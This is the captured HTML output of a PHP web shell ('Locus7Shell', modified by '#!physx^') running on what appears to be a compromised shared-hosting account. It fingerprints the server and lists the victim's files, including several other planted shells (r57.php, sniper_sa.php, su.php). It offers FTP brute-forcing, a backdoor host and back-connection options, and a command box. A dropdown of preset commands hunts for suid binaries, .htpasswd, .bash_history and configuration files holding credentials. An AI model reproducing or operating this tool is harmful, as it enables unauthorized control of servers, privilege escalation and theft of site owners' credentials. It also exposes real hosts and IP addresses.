<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1251"><meta http-equiv="Content-Language" content="en-us"><title>www.storiesofourlives.net - Locus7Shell</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #009900; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #009900; scrollbar-shadow-color: #000000; scrollbar-highlight-color: #00CC00; scrollbar-3dlight-color: #00CC00; scrollbar-darkshadow-color: #009900; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #000000; COLOR: green; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #009900; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #f89521; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #f89521; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #f89521; TEXT-DECORATION: none;}A:hover { COLOR: #f89521; TEXT-DECORATION: bold;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #009900; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #009900; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #009900; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #009900; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #009900; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #009900; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #009900; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #009900;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><center><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr><th width="101%" height="15" nowrap bordercolor="#C0C0C0" valign="top" colspan="2"><p><center><img src="http://img244.imageshack.us/img244/6663/locus7sgm8.jpg"></p></center></th></tr><tr><td><p align="left"><b>Software:&nbsp;Apache/1.3.33 (Unix) mod_log_bytes/0.3 FrontPage/5.0.2.2635 <a href="?act=phpinfo" target="_blank"><b><u>PHP/4.4.1</u></b></a> mod_ssl/2.8.22 OpenSSL/0.9.7g</b>&nbsp;</p><p align="left"><b>uname -a:&nbsp;FreeBSD df20.dot5hosting.com 4.11-STABLE FreeBSD 4.11-STABLE #0: Wed Apr i386</b>&nbsp;</p><p align="left"><b>uid=80(www) gid=80(www) groups=80(www)
</b>&nbsp;</p><p align="left"><b>Safe-mode:&nbsp;<font color=green>OFF (not secure)</font></b></p><p align="left"><a href="?act=ls&d=%2F&sort=0a"><b>/</b></a><a href="?act=ls&d=%2Fhome%2F&sort=0a"><b>home/</b></a><a href="?act=ls&d=%2Fhome%2Fstorieso%2F&sort=0a"><b>storieso/</b></a><a href="?act=ls&d=%2Fhome%2Fstorieso%2Fpublic_html%2F&sort=0a"><b>public_html/</b></a>&nbsp;&nbsp;&nbsp;<b><font color=white>drwxr-xr-x</font></b><br><b>Free 41.56 GB of 207.59 GB (20.02%)</b><br><b>Your ip: <a href=http://whois.domaintools.com/196.218.81.215>196.218.81.215</a> - Server ip: <a href=http://whois.domaintools.com/72.22.69.238>72.22.69.238</a></b><br/><a href="?"><img src="?act=img&img=home" alt="Home" height="20" width="20" border="0"></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="#" onclick="history.back(1)"><img src="?act=img&img=back" alt="Back" height="20" width="20" border="0"></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="#" onclick="history.go(1)"><img src="?act=img&img=forward" alt="Forward" height="20" width="20" border="0"></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="?act=ls&d=%2Fhome%2Fstorieso&sort=0a"><img src="?act=img&img=up" alt="UPDIR" height="20" width="20" border="0"></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=""><img src="?act=img&img=refresh" alt="Refresh" height="20" width="17" border="0"></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="?act=search&d=%2Fhome%2Fstorieso%2Fpublic_html%2F"><img src="?act=img&img=search" alt="Search" height="20" width="20" border="0"></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="?act=fsbuff&d=%2Fhome%2Fstorieso%2Fpublic_html%2F"><img src="?act=img&img=buffer" alt="Buffer" height="20" width="20" border="0"></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="http://df20.dot5hosting.com/~storieso/x2300.php"><br><center><b>[Enumerate]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="?act=encoder&d=%2Fhome%2Fstorieso%2Fpublic_html%2F"><b>[Encoder]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="?act=tools&d=%2Fhome%2Fstorieso%2Fpublic_html%2F"><b>[Tools]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="?act=processes&d=%2Fhome%2Fstorieso%2Fpublic_html%2F"><b>[Proc.]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="?act=ftpquickbrute&d=%2Fhome%2Fstorieso%2Fpublic_html%2F"><b>[FTP Brute]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="?act=security&d=%2Fhome%2Fstorieso%2Fpublic_html%2F"><b>[Sec.]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="?act=sql&d=%2Fhome%2Fstorieso%2Fpublic_html%2F"><b>[SQL]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="?act=eval&d=%2Fhome%2Fstorieso%2Fpublic_html%2F"><b>[PHP-Code]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="?act=shbd"><b>[Backdoor Host]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="?act=backc"><b>[Back-Connection]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="http://milw0rm.com/search.php?dong=FreeBSD 4.1"><b>[milw0rm it!]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="http://twofaced.org/proxy/index.php?q=aHR0cDovL3N0b3JpZXNvZm91cmxpdmVzLm5ldC9zdS5waHA="><b>[PHP-Proxy]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="?act=selfremove"><b>[Self remove]</b></center></a>&nbsp;&nbsp;&nbsp;&nbsp;</p></td></tr></table><br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1><tr><td width="100%" valign="top"><center><b>x2300 Locus7Shell Modified by #!physx^ </b></center></td></tr></table><br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1><tr><td width="100%" valign="top"><center><b>Listing folder (8 files and 11 folders):</b></center><br><TABLE cellSpacing=0 cellPadding=0 width=100% bgcolor=#000000 borderColorLight=#433333 border=0><form action="?" method=POST name="ls_form"><input type=hidden name=act value=ls><input type=hidden name=d value=/home/storieso/public_html/><tr>

<td><b>Name</b><a href="?act=ls&d=%2Fhome%2Fstorieso%2Fpublic_html%2F&sort=0d"><img src="?act=img&img=sort_asc" height="9" width="14" alt="Asc." border="0"></a></td>
<td><a href="?act=ls&d=%2Fhome%2Fstorieso%2Fpublic_html%2F&sort=1a"><b>Size</b></a></td>
<td><a href="?act=ls&d=%2Fhome%2Fstorieso%2Fpublic_html%2F&sort=2a"><b>Modify</b></a></td>
<td><a href="?act=ls&d=%2Fhome%2Fstorieso%2Fpublic_html%2F&sort=3a"><b>Owner/Group</b></a></td>
<td><a href="?act=ls&d=%2Fhome%2Fstorieso%2Fpublic_html%2F&sort=4a"><b>Perms</b></a></td>
<td><b>Action</b></td>
</tr>
<tr>
<td><img src="?act=img&img=small_dir" height="16" width="19" border="0">&nbsp;<a href="?act=ls&d=%2Fhome%2Fstorieso%2Fpublic_html&sort=0a">.</a></td>
<td>LINK</td>

<td>06.05.2007 05:31:36</td>
<td>storieso/storieso</td>
<td><a href="?act=chmod&f=.&d=%2Fhome%2Fstorieso%2Fpublic_html"><b><font color=white>drwxr-xr-x</font></b></a></td>
<td><a href="?act=d&d=%2Fhome%2Fstorieso%2Fpublic_html%2F."><img src="?act=img&img=ext_diz" alt="Info" height="16" width="16" border="0"></a>&nbsp;<input type="checkbox" name="actbox[]" onclick="ls_reverse_all();"></td>
</tr>
<tr>
<td><img src="?act=img&img=ext_lnk" height="16" width="19" border="0">&nbsp;<a href="?act=ls&d=%2Fhome%2Fstorieso&sort=0a">..</a></td>
<td>LINK</td>
<td>01.05.2007 04:36:43</td>
<td>storieso/storieso</td>

<td><a href="?act=chmod&f=..&d=%2Fhome%2Fstorieso%2Fpublic_html"><b><font color=white>drwxr-xr-x</font></b></a></td>
<td><a href="?act=d&d=%2Fhome%2Fstorieso%2Fpublic_html%2F.."><img src="?act=img&img=ext_diz" alt="Info" height="16" width="16" border="0"></a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox0" value="/home/storieso/public_html/.."></td>
</tr>
<tr>
<td><img src="?act=img&img=small_dir" height="16" width="19" border="0">&nbsp;<a href="?act=ls&d=%2Fhome%2Fstorieso%2Fpublic_html%2F.thumbs&sort=0a">[.thumbs]</a></td>
<td>DIR</td>
<td>03.10.2006 03:23:40</td>
<td>storieso/storieso</td>
<td><a href="?act=chmod&f=.thumbs&d=%2Fhome%2Fstorieso%2Fpublic_html"><b><font color=white>drwxr-xr-x</font></b></a></td>
<td><a href="?act=d&d=%2Fhome%2Fstorieso%2Fpublic_html%2F.thumbs"><img src="?act=img&img=ext_diz" alt="Info" height="16" width="16" border="0"></a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox1" value="/home/storieso/public_html/.thumbs"></td>
</tr>

<tr>
<td><img src="?act=img&img=small_dir" height="16" width="19" border="0">&nbsp;<a href="?act=ls&d=%2Fhome%2Fstorieso%2Fpublic_html%2FPHP-Nuke1&sort=0a">[PHP-Nuke1]</a></td>
<td>DIR</td>
<td>02.10.2006 02:27:26</td>
<td>storieso/storieso</td>
<td><a href="?act=chmod&f=PHP-Nuke1&d=%2Fhome%2Fstorieso%2Fpublic_html"><b><font color=white>drwxr-xr-x</font></b></a></td>
<td><a href="?act=d&d=%2Fhome%2Fstorieso%2Fpublic_html%2FPHP-Nuke1"><img src="?act=img&img=ext_diz" alt="Info" height="16" width="16" border="0"></a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox2" value="/home/storieso/public_html/PHP-Nuke1"></td>
</tr>
<tr>
<td><img src="?act=img&img=small_dir" height="16" width="19" border="0">&nbsp;<a href="?act=ls&d=%2Fhome%2Fstorieso%2Fpublic_html%2F_private&sort=0a">[_private]</a></td>
<td>DIR</td>

<td>02.10.2006 02:27:23</td>
<td>storieso/storieso</td>
<td><a href="?act=chmod&f=_private&d=%2Fhome%2Fstorieso%2Fpublic_html"><b><font color=red>drwx------</font></b></a></td>
<td><a href="?act=d&d=%2Fhome%2Fstorieso%2Fpublic_html%2F_private"><img src="?act=img&img=ext_diz" alt="Info" height="16" width="16" border="0"></a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox3" value="/home/storieso/public_html/_private"></td>
</tr>
<tr>
<td><img src="?act=img&img=small_dir" height="16" width="19" border="0">&nbsp;<a href="?act=ls&d=%2Fhome%2Fstorieso%2Fpublic_html%2F_vti_bin&sort=0a">[_vti_bin]</a></td>
<td>DIR</td>
<td>02.10.2006 02:27:23</td>
<td>storieso/storieso</td>

<td><a href="?act=chmod&f=_vti_bin&d=%2Fhome%2Fstorieso%2Fpublic_html"><b><font color=white>drwxr-xr-x</font></b></a></td>
<td><a href="?act=d&d=%2Fhome%2Fstorieso%2Fpublic_html%2F_vti_bin"><img src="?act=img&img=ext_diz" alt="Info" height="16" width="16" border="0"></a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox4" value="/home/storieso/public_html/_vti_bin"></td>
</tr>
<tr>
<td><img src="?act=img&img=small_dir" height="16" width="19" border="0">&nbsp;<a href="?act=ls&d=%2Fhome%2Fstorieso%2Fpublic_html%2F_vti_cnf&sort=0a">[_vti_cnf]</a></td>
<td>DIR</td>
<td>02.10.2006 02:27:32</td>
<td>storieso/storieso</td>
<td><a href="?act=chmod&f=_vti_cnf&d=%2Fhome%2Fstorieso%2Fpublic_html"><b><font color=white>drwxr-xr-x</font></b></a></td>
<td><a href="?act=d&d=%2Fhome%2Fstorieso%2Fpublic_html%2F_vti_cnf"><img src="?act=img&img=ext_diz" alt="Info" height="16" width="16" border="0"></a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox5" value="/home/storieso/public_html/_vti_cnf"></td>
</tr>

<tr>
<td><img src="?act=img&img=small_dir" height="16" width="19" border="0">&nbsp;<a href="?act=ls&d=%2Fhome%2Fstorieso%2Fpublic_html%2F_vti_log&sort=0a">[_vti_log]</a></td>
<td>DIR</td>
<td>02.10.2006 02:27:23</td>
<td>storieso/storieso</td>
<td><a href="?act=chmod&f=_vti_log&d=%2Fhome%2Fstorieso%2Fpublic_html"><b><font color=white>drwxr-xr-x</font></b></a></td>
<td><a href="?act=d&d=%2Fhome%2Fstorieso%2Fpublic_html%2F_vti_log"><img src="?act=img&img=ext_diz" alt="Info" height="16" width="16" border="0"></a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox6" value="/home/storieso/public_html/_vti_log"></td>
</tr>
<tr>
<td><img src="?act=img&img=small_dir" height="16" width="19" border="0">&nbsp;<a href="?act=ls&d=%2Fhome%2Fstorieso%2Fpublic_html%2F_vti_pvt&sort=0a">[_vti_pvt]</a></td>
<td>DIR</td>

<td>02.10.2006 02:27:33</td>
<td>storieso/storieso</td>
<td><a href="?act=chmod&f=_vti_pvt&d=%2Fhome%2Fstorieso%2Fpublic_html"><b><font color=white>drwxr-xr-x</font></b></a></td>
<td><a href="?act=d&d=%2Fhome%2Fstorieso%2Fpublic_html%2F_vti_pvt"><img src="?act=img&img=ext_diz" alt="Info" height="16" width="16" border="0"></a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox7" value="/home/storieso/public_html/_vti_pvt"></td>
</tr>
<tr>
<td><img src="?act=img&img=small_dir" height="16" width="19" border="0">&nbsp;<a href="?act=ls&d=%2Fhome%2Fstorieso%2Fpublic_html%2F_vti_txt&sort=0a">[_vti_txt]</a></td>
<td>DIR</td>
<td>02.10.2006 02:27:23</td>
<td>storieso/storieso</td>

<td><a href="?act=chmod&f=_vti_txt&d=%2Fhome%2Fstorieso%2Fpublic_html"><b><font color=white>drwxr-xr-x</font></b></a></td>
<td><a href="?act=d&d=%2Fhome%2Fstorieso%2Fpublic_html%2F_vti_txt"><img src="?act=img&img=ext_diz" alt="Info" height="16" width="16" border="0"></a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox8" value="/home/storieso/public_html/_vti_txt"></td>
</tr>
<tr>
<td><img src="?act=img&img=small_dir" height="16" width="19" border="0">&nbsp;<a href="?act=ls&d=%2Fhome%2Fstorieso%2Fpublic_html%2Fbestcab.net&sort=0a">[bestcab.net]</a></td>
<td>DIR</td>
<td>03.10.2006 09:59:14</td>
<td>storieso/storieso</td>
<td><a href="?act=chmod&f=bestcab.net&d=%2Fhome%2Fstorieso%2Fpublic_html"><b><font color=white>drwxr-xr-x</font></b></a></td>
<td><a href="?act=d&d=%2Fhome%2Fstorieso%2Fpublic_html%2Fbestcab.net"><img src="?act=img&img=ext_diz" alt="Info" height="16" width="16" border="0"></a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox9" value="/home/storieso/public_html/bestcab.net"></td>
</tr>

<tr>
<td><img src="?act=img&img=small_dir" height="16" width="19" border="0">&nbsp;<a href="?act=ls&d=%2Fhome%2Fstorieso%2Fpublic_html%2Fcgi-bin&sort=0a">[cgi-bin]</a></td>
<td>DIR</td>
<td>18.07.2006 02:23:45</td>
<td>storieso/storieso</td>
<td><a href="?act=chmod&f=cgi-bin&d=%2Fhome%2Fstorieso%2Fpublic_html"><b><font color=white>drwxr-xr-x</font></b></a></td>
<td><a href="?act=d&d=%2Fhome%2Fstorieso%2Fpublic_html%2Fcgi-bin"><img src="?act=img&img=ext_diz" alt="Info" height="16" width="16" border="0"></a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox10" value="/home/storieso/public_html/cgi-bin"></td>
</tr>
<tr>
<td><img src="?act=img&img=small_dir" height="16" width="19" border="0">&nbsp;<a href="?act=ls&d=%2Fhome%2Fstorieso%2Fpublic_html%2Fvb&sort=0a">[vb]</a></td>
<td>DIR</td>

<td>01.05.2007 04:40:18</td>
<td>storieso/storieso</td>
<td><a href="?act=chmod&f=vb&d=%2Fhome%2Fstorieso%2Fpublic_html"><b><font color=white>drwxr-xr-x</font></b></a></td>
<td><a href="?act=d&d=%2Fhome%2Fstorieso%2Fpublic_html%2Fvb"><img src="?act=img&img=ext_diz" alt="Info" height="16" width="16" border="0"></a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox11" value="/home/storieso/public_html/vb"></td>
</tr>
<tr>
<td><img src="?act=img&img=ext_htaccess" border="0">&nbsp;<a href="?act=f&f=.htaccess&d=%2Fhome%2Fstorieso%2Fpublic_html&">.htaccess</a></td>
<td>482 B</td>
<td>01.05.2007 04:36:43</td>
<td>storieso/storieso</td>

<td><a href="?act=chmod&f=.htaccess&d=%2Fhome%2Fstorieso%2Fpublic_html"><b><font color=white>-rw-r--r--</font></b></a></td>
<td><a href="?act=f&f=.htaccess&ft=info&d=%2Fhome%2Fstorieso%2Fpublic_html"><img src="?act=img&img=ext_diz" alt="Info" height="16" width="16" border="0"></a>&nbsp;<a href="?act=f&f=.htaccess&ft=edit&d=%2Fhome%2Fstorieso%2Fpublic_html"><img src="?act=img&img=change" alt="Change" height="16" width="19" border="0"></a>&nbsp;<a href="?act=f&f=.htaccess&ft=download&d=%2Fhome%2Fstorieso%2Fpublic_html"><img src="?act=img&img=download" alt="Download" height="16" width="19" border="0"></a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox12" value="/home/storieso/public_html/.htaccess"></td>
</tr>
<tr>
<td><img src="?act=img&img=ext_html" border="0">&nbsp;<a href="?act=f&f=_vti_inf.html&d=%2Fhome%2Fstorieso%2Fpublic_html&">_vti_inf.html</a></td>
<td>1.71 KB</td>
<td>02.10.2006 02:27:23</td>
<td>storieso/storieso</td>
<td><a href="?act=chmod&f=_vti_inf.html&d=%2Fhome%2Fstorieso%2Fpublic_html"><b><font color=white>-rw-r--r--</font></b></a></td>
<td><a href="?act=f&f=_vti_inf.html&ft=info&d=%2Fhome%2Fstorieso%2Fpublic_html"><img src="?act=img&img=ext_diz" alt="Info" height="16" width="16" border="0"></a>&nbsp;<a href="?act=f&f=_vti_inf.html&ft=edit&d=%2Fhome%2Fstorieso%2Fpublic_html"><img src="?act=img&img=change" alt="Change" height="16" width="19" border="0"></a>&nbsp;<a href="?act=f&f=_vti_inf.html&ft=download&d=%2Fhome%2Fstorieso%2Fpublic_html"><img src="?act=img&img=download" alt="Download" height="16" width="19" border="0"></a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox13" value="/home/storieso/public_html/_vti_inf.html"></td>
</tr>

<tr>
<td><img src="?act=img&img=ext_htm" border="0">&nbsp;<a href="?act=f&f=index.htm&d=%2Fhome%2Fstorieso%2Fpublic_html&">index.htm</a></td>
<td>4.08 KB</td>
<td>06.05.2007 05:31:36</td>
<td>storieso/storieso</td>
<td><a href="?act=chmod&f=index.htm&d=%2Fhome%2Fstorieso%2Fpublic_html"><b><font color=white>-rw-r--r--</font></b></a></td>
<td><a href="?act=f&f=index.htm&ft=info&d=%2Fhome%2Fstorieso%2Fpublic_html"><img src="?act=img&img=ext_diz" alt="Info" height="16" width="16" border="0"></a>&nbsp;<a href="?act=f&f=index.htm&ft=edit&d=%2Fhome%2Fstorieso%2Fpublic_html"><img src="?act=img&img=change" alt="Change" height="16" width="19" border="0"></a>&nbsp;<a href="?act=f&f=index.htm&ft=download&d=%2Fhome%2Fstorieso%2Fpublic_html"><img src="?act=img&img=download" alt="Download" height="16" width="19" border="0"></a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox14" value="/home/storieso/public_html/index.htm"></td>
</tr>
<tr>
<td><img src="?act=img&img=ext_html" border="0">&nbsp;<a href="?act=f&f=postinfo.html&d=%2Fhome%2Fstorieso%2Fpublic_html&">postinfo.html</a></td>
<td>2.4 KB</td>

<td>02.10.2006 02:27:19</td>
<td>storieso/storieso</td>
<td><a href="?act=chmod&f=postinfo.html&d=%2Fhome%2Fstorieso%2Fpublic_html"><b><font color=white>-rw-r--r--</font></b></a></td>
<td><a href="?act=f&f=postinfo.html&ft=info&d=%2Fhome%2Fstorieso%2Fpublic_html"><img src="?act=img&img=ext_diz" alt="Info" height="16" width="16" border="0"></a>&nbsp;<a href="?act=f&f=postinfo.html&ft=edit&d=%2Fhome%2Fstorieso%2Fpublic_html"><img src="?act=img&img=change" alt="Change" height="16" width="19" border="0"></a>&nbsp;<a href="?act=f&f=postinfo.html&ft=download&d=%2Fhome%2Fstorieso%2Fpublic_html"><img src="?act=img&img=download" alt="Download" height="16" width="19" border="0"></a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox15" value="/home/storieso/public_html/postinfo.html"></td>
</tr>
<tr>
<td><img src="?act=img&img=ext_php" border="0">&nbsp;<a href="?act=f&f=r57.php&d=%2Fhome%2Fstorieso%2Fpublic_html&">r57.php</a></td>
<td>15.09 KB</td>
<td>06.05.2007 04:54:32</td>
<td>storieso/storieso</td>

<td><a href="?act=chmod&f=r57.php&d=%2Fhome%2Fstorieso%2Fpublic_html"><b><font color=white>-rw-r--r--</font></b></a></td>
<td><a href="?act=f&f=r57.php&ft=info&d=%2Fhome%2Fstorieso%2Fpublic_html"><img src="?act=img&img=ext_diz" alt="Info" height="16" width="16" border="0"></a>&nbsp;<a href="?act=f&f=r57.php&ft=edit&d=%2Fhome%2Fstorieso%2Fpublic_html"><img src="?act=img&img=change" alt="Change" height="16" width="19" border="0"></a>&nbsp;<a href="?act=f&f=r57.php&ft=download&d=%2Fhome%2Fstorieso%2Fpublic_html"><img src="?act=img&img=download" alt="Download" height="16" width="19" border="0"></a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox16" value="/home/storieso/public_html/r57.php"></td>
</tr>
<tr>
<td><img src="?act=img&img=ext_php" border="0">&nbsp;<a href="?act=f&f=sniper_sa.php&d=%2Fhome%2Fstorieso%2Fpublic_html&">sniper_sa.php</a></td>
<td>103.55 KB</td>
<td>06.05.2007 05:06:20</td>
<td>storieso/storieso</td>
<td><a href="?act=chmod&f=sniper_sa.php&d=%2Fhome%2Fstorieso%2Fpublic_html"><b><font color=white>-rw-r--r--</font></b></a></td>
<td><a href="?act=f&f=sniper_sa.php&ft=info&d=%2Fhome%2Fstorieso%2Fpublic_html"><img src="?act=img&img=ext_diz" alt="Info" height="16" width="16" border="0"></a>&nbsp;<a href="?act=f&f=sniper_sa.php&ft=edit&d=%2Fhome%2Fstorieso%2Fpublic_html"><img src="?act=img&img=change" alt="Change" height="16" width="19" border="0"></a>&nbsp;<a href="?act=f&f=sniper_sa.php&ft=download&d=%2Fhome%2Fstorieso%2Fpublic_html"><img src="?act=img&img=download" alt="Download" height="16" width="19" border="0"></a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox17" value="/home/storieso/public_html/sniper_sa.php"></td>
</tr>

<tr>
<td><img src="?act=img&img=ext_php" border="0">&nbsp;<a href="?act=f&f=su.php&d=%2Fhome%2Fstorieso%2Fpublic_html&"><font color="yellow">su.php</font></a></td>
<td>227.24 KB</td>
<td>23.03.2007 13:06:52</td>
<td>storieso/storieso</td>
<td><a href="?act=chmod&f=su.php&d=%2Fhome%2Fstorieso%2Fpublic_html"><b><font color=white>-rw-r--r--</font></b></a></td>
<td><a href="?act=f&f=su.php&ft=info&d=%2Fhome%2Fstorieso%2Fpublic_html"><img src="?act=img&img=ext_diz" alt="Info" height="16" width="16" border="0"></a>&nbsp;<a href="?act=f&f=su.php&ft=edit&d=%2Fhome%2Fstorieso%2Fpublic_html"><img src="?act=img&img=change" alt="Change" height="16" width="19" border="0"></a>&nbsp;<a href="?act=f&f=su.php&ft=download&d=%2Fhome%2Fstorieso%2Fpublic_html"><img src="?act=img&img=download" alt="Download" height="16" width="19" border="0"></a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox18" value="/home/storieso/public_html/su.php"></td>
</tr>
<tr>
<td><img src="?act=img&img=ext_gif" border="0">&nbsp;<a href="?act=f&f=vdeck_logo.gif&d=%2Fhome%2Fstorieso%2Fpublic_html&">vdeck_logo.gif</a></td>
<td>4.9 KB</td>

<td>18.07.2006 02:23:45</td>
<td>storieso/storieso</td>
<td><a href="?act=chmod&f=vdeck_logo.gif&d=%2Fhome%2Fstorieso%2Fpublic_html"><b><font color=white>-rw-r--r--</font></b></a></td>
<td><a href="?act=f&f=vdeck_logo.gif&ft=info&d=%2Fhome%2Fstorieso%2Fpublic_html"><img src="?act=img&img=ext_diz" alt="Info" height="16" width="16" border="0"></a>&nbsp;<a href="?act=f&f=vdeck_logo.gif&ft=edit&d=%2Fhome%2Fstorieso%2Fpublic_html"><img src="?act=img&img=change" alt="Change" height="16" width="19" border="0"></a>&nbsp;<a href="?act=f&f=vdeck_logo.gif&ft=download&d=%2Fhome%2Fstorieso%2Fpublic_html"><img src="?act=img&img=download" alt="Download" height="16" width="19" border="0"></a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox19" value="/home/storieso/public_html/vdeck_logo.gif"></td>
</tr>
</table><hr size="1" noshade><p align="right"> 
  <script> 
  function ls_setcheckboxall(status) 
  { 
   var id = 1; 
   var num = 20; 
   while (id <= num) 
   { 
    document.getElementById('actbox'+id).checked = status; 
    id++; 
   } 
  } 
  function ls_reverse_all() 
  { 
   var id = 1; 
   var num = 20; 
   while (id <= num) 
   { 
    document.getElementById('actbox'+id).checked = !document.getElementById('actbox'+id).checked; 
    id++; 
   } 
  } 
  </script> 
  <input type="button" onclick="ls_setcheckboxall(true);" value="Select all">&nbsp;&nbsp;<input type="button" onclick="ls_setcheckboxall(false);" value="Unselect all">  
  <b><img src="?act=img&img=arrow_ltr" border="0"><select name=act><option value="ls">With selected:</option><option value=delete>Delete</option><option value=chmod>Change-mode</option><option value=cut>Cut</option><option value=copy>Copy</option><option value=unselect>Unselect</option></select>&nbsp;<input type=submit value="Confirm"></p></form></td></tr></table><a bookmark="minipanel"><br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1> 

<tr><td width="100%" height="1" valign="top" colspan="2"></td></tr> 
<tr><td width="50%" height="1" valign="top"><center><b>Enter: </b><form action="?"><input type=hidden name=act value="cmd"><input type=hidden name="d" value="/home/storieso/public_html/"><input type="text" name="cmd" size="50" value=""><input type=hidden name="cmd_txt" value="1">&nbsp;<input type=submit name=submit value="Execute"></form></td><td width="50%" height="1" valign="top"><center><b>Select: </b><form action="?act=cmd" method="POST"><input type=hidden name=act value="cmd"><input type=hidden name="d" value="/home/storieso/public_html/"><select name="cmd"><option value="ls -la">-----------------------------------------------------------</option><option value="find / -type f -perm -04000 -ls">find all suid files</option><option value="find . -type f -perm -04000 -ls">find suid files in current dir</option><option value="find / -type f -perm -02000 -ls">find all sgid files</option><option value="find . -type f -perm -02000 -ls">find sgid files in current dir</option><option value="find / -type f -name config.inc.php">find config.inc.php files</option><option value="find / -type f -name &quot;config*&quot;">find config* files</option><option value="find . -type f -name &quot;config*&quot;">find config* files in current dir</option><option value="find / -perm -2 -ls">find all writable folders and files</option><option value="find . -perm -2 -ls">find all writable folders and files in current dir</option><option value="find / -type f -name service.pwd">find all service.pwd files</option><option value="find . -type f -name service.pwd">find service.pwd files in current dir</option><option value="find / -type f -name .htpasswd">find all .htpasswd files</option><option value="find . -type f -name .htpasswd">find .htpasswd files in current dir</option><option value="find / -type f -name .bash_history">find all .bash_history files</option><option value="find . -type f -name .bash_history">find .bash_history files in current dir</option><option value="find / -type f -name .fetchmailrc">find all .fetchmailrc files</option><option value="find . -type f -name .fetchmailrc">find .fetchmailrc files in current dir</option><option value="lsattr -va">list file attributes on a Linux second extended file system</option><option value="netstat -an | grep -i listen">show opened ports</option></select><input type=hidden name="cmd_txt" value="1">&nbsp;<input type=submit name=submit value="Execute"></form></td></tr></TABLE> 

<br> 
<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="116" width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1> 
<tr><td height="1" valign="top" colspan="2"></td></tr> 
<tr> 
  <td width="50%" height="83" valign="top"><center> 
